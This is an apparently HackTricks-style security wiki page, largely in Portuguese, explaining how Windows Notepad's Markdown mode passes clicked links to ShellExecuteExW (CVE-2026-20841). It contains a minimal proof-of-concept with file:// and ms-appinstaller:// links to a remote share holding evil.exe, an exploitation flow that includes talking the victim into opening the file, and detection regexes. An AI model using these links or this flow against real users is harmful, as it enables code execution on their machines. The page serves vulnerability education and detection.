# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Aplicações modernas do Windows que renderizam Markdown/HTML frequentemente transformam links fornecidos pelo usuário em elementos clicáveis e os passam para `ShellExecuteExW`. Sem uma lista de esquemas permitidos (allowlisting) estrita, qualquer protocol handler registrado (por exemplo, `file:`, `ms-appinstaller:`) pode ser acionado, levando à execução de código no contexto do usuário atual.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad escolhe o modo Markdown **somente para extensões `.md`** via uma comparação de string fixa em `sub_1400ED5D0()`.
- Links Markdown suportados:
- Padrão: `[text](target)`
- Autolink: `<target>` (renderizado como `[target](target)`), então ambas as sintaxes importam para payloads e detecções.
- Clique em links é processado em `sub_140170F60()`, que realiza um filtro fraco e então chama `ShellExecuteExW`.
- `ShellExecuteExW` despacha para **any configured protocol handler**, não apenas HTTP(S).

### Payload considerations
- Qualquer sequência `\\` no link é **normalizada para `\`** antes de `ShellExecuteExW`, impactando a construção de caminhos/UNC e a detecção.
- Arquivos `.md` **não estão associados ao Notepad por padrão**; a vítima ainda precisa abrir o arquivo no Notepad e clicar no link, mas uma vez renderizado, o link fica clicável.
- Exemplos de esquemas perigosos:
- `file://` para lançar um payload local/UNC.
- `ms-appinstaller://` para acionar fluxos do App Installer. Outros esquemas registrados localmente também podem ser abusados.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Fluxo de exploração
1. Crie um **`.md` file** para que o Notepad o renderize como Markdown.
2. Incorpore um link usando um esquema URI perigoso (`file:`, `ms-appinstaller:`, ou qualquer handler instalado).
3. Entregue o arquivo (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ou similar) e convença o usuário a abri-lo no Notepad.
4. Ao clicar, o **link normalizado** é passado para `ShellExecuteExW` e o handler de protocolo correspondente executa o conteúdo referenciado no contexto do usuário.

## Ideias de detecção
- Monitore transferências de arquivos `.md` através de portas/protocolos que comumente entregam documentos: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analise links Markdown (padrão e autolink) e procure por **insensível a maiúsculas/minúsculas** `file:` ou `ms-appinstaller:`.
- Expressões regulares recomendadas pelo fornecedor para detectar acesso a recursos remotos:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- O comportamento do patch supostamente **lista de permissões para arquivos locais e HTTP(S)**; qualquer outra coisa que alcance `ShellExecuteExW` é suspeita. Estenda as detecções para outros manipuladores de protocolo instalados conforme necessário, já que a superfície de ataque varia por sistema.

## Referências
- [CVE-2026-20841: Execução Arbitrária de Código no Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
